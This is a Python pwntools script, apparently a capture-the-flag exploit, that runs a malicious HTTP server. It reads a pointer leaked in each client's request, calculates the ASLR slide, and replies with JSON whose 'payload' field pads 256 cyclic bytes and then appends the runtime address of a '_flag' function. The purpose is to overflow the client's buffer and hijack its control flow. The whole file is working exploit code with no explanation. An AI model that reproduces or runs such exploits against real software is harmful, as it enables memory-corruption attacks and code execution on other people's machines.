from pwn import *
import json
g = cyclic_gen()
HOST = "192.168.129.136"
PORT = 8000

TARGET = 0x102ac40e4
PAD = 256


def build_overflow_json(target_addr, pad_len, name="x", coupon="x"):
    addr_bytes = target_addr.to_bytes(8, "little")
    suffix = ""
    for b in addr_bytes:
        if b == 0:
            break
        suffix += chr(b)
    payload = g.get(pad_len).decode() + suffix
    return json.dumps({"name": name, "coupon": coupon, "payload": payload})


def build_response(target):
    body = build_overflow_json(target, PAD).encode()
    headers = [
        "HTTP/1.1 200 OK",
        "Content-Type: application/json",
        "Content-Length: " + str(len(body)),
        "Connection: close",
        "",
        "",
    ]
    return "\r\n".join(headers).encode() + body


def main():
    log.info("target=" + hex(TARGET) + " pad=" + str(PAD))
    while True:
        conn = listen(PORT, bindaddr=HOST).wait_for_connection()
        log.info("connection from " + str(conn.rhost) + ":" + str(conn.rport))
        received = conn.recv(timeout=2)
        log.info("received: " + str(received))

        string = received.decode() 
        pointer = string.split("Z")[1]
        pointer = pointer.split(" ")[0]
        pointer = "0x" + pointer
        print(pointer)

        aslr = int(pointer, 16) - 0x1000048e8
        print("slide =", hex(aslr))

        flag_addr = 0x100000000 + aslr + 0x40e4
        dat_addr = 0x100000000 + aslr + 0x157d0
        print("_flag runtime =", hex(flag_addr))
        print("DAT_1000157d0 runtime =", hex(dat_addr))

        response = build_response(flag_addr)
        conn.send(response)
        conn.close()


if __name__ == "__main__":
    main()